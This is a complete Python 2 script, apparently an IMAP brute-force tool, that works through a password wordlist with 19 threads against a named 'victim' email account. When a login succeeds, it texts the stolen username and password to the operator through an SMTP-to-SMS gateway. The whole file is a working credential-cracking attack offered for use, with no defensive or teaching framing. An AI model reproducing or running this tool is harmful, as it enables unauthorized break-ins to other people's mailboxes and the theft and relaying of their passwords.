'Author: Tyler Price'

import imaplib
import sys
import threading
import thread
from Queue import Queue
import time
from termcolor import colored
import os
import smtplib
import time
import argparse

# Usage:  imapbrute.py [-h] [-eU EUSERNAME] [-eP EPASSWORD] [-eS SMTP] [-n NUMBER] [-u USERNAME] [-Is SERVER] [-f PATH]

parser = argparse.ArgumentParser(description = "IMAP Brute Forcer By: Tyler Price")
group = parser.add_argument_group('required arguments')
group.add_argument('-eU', action="store", dest="eUsername", help="Personal Email Username")
group.add_argument('-eP', action="store", dest="ePassword", help= "Personal Email Password")
group.add_argument('-eS', action="store", dest="SMTP", help="Personal Email Server")
group.add_argument('-n', action="store", dest="number", help="Personal Phone number")
group.add_argument('-u', action="store", dest="username", help="Victim Username")
group.add_argument('-Is', action="store", dest="server" , help="IMAP Server Address")
group.add_argument('-f', action="store", dest="path", help="Wordlist Path")

print colored("\nAttention: Enter -n as number@mms.att.net = AT&T number@vtext.com = Verizon number@messaging.sprintpcs.com = Sprint\n", "red")

args = parser.parse_args()

if args > 7:

	print parser.print_help()

	sys.exit(0)

eUsername = args.eUsername
ePassword = args.ePassword
SMTP = args.SMTP
number = args.number
username = args.username
server = args.server
path = args.path

Server = server

server = smtplib.SMTP(SMTP, 587)
server.ehlo()
server.starttls()

server.login(eUsername, ePassword)

def SucessMessage(username,password):

	server.sendmail(eUsername, number, username)
	server.sendmail(eUsername, number, '[!] Login Sucessful ' + password)

def crack(username, password):

	lock = threading.RLock()

	try:

		with lock:

			mail = imaplib.IMAP4_SSL(Server)

			mail.login(username, password)

			print colored("[!] Login Sucessful User: %s Password: %s" ,"green") % (username, password)

			print colored("[!] Exiting...", "yellow")

			thread.start_new_thread(SucessMessage, (username, password, ) )

			time.sleep(1)

			os._exit(1)

	except imaplib.IMAP4.error:

		print colored("[+] Login Failed User: %s Password: %s", "red") % (username, password)


def Worker():

	while True:

		password = q.get()

		crack(username, password)

		q.task_done()

filename = open(path, 'r')

q = Queue()

for x in range(1, 20):

	t = threading.Thread(target=Worker, args=())
	t.daemon = True
	t.start()

for x in filename:

	q.put(x)

q.join()

print colored("[!!!] Attack Complete...Password Not Found", "yellow")

server.sendmail(eUsername, number, username)
server.sendmail(eUsername, number, '[!!!] Attack Complete...Password Not Found')
